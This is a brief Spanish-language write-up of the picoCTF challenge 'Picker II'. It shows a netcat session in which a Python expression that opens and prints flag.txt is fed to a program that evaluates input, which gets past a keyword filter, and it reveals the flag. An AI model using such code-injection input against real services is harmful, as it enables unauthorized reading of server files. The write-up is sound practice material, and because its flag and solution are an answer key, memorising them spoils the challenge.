### Descripción
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 55393`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/521/picker-II.py).
### Solución
```
giselle_maz-picoctf@webshell:~$ nc saturn.picoctf.net 53089
==> print(open('flag.txt','r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
'NoneType' object is not callable


en lugar de escribir win, imprimimos la flag, asi brincamos el filtro y nos deja verla.
```
### Notas adicionales 
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
### Referencias